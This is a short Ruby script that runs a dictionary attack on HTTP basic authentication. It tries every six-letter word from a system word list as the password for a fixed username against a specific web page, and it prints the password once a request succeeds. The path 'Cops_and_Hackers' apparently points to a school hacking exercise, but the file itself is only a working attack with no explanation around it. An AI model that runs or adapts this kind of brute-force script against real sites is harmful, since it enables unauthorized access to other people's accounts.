require 'net/http'

username = '4sem_uk'

dict_path = '/usr/share/dict/american-english'

lines = []
# Remember the '\n' in length and to strip it
File.open(dict_path).each_line {|line| lines << line.strip if line.length == 7}

uri = URI('http://www.triumph-kbh.com/skole_KEA/Cops_and_Hackers/C_and_H_stuff/CHstuff.html')
lines.each do |e|
  Net::HTTP.start(uri.host) do |http|
    request = Net::HTTP::Get.new uri.request_uri
    request.basic_auth username, e
    res = http.request request
    if res.is_a?(Net::HTTPSuccess)
      puts "Password is: #{e}"
      exit
    end
  end
end
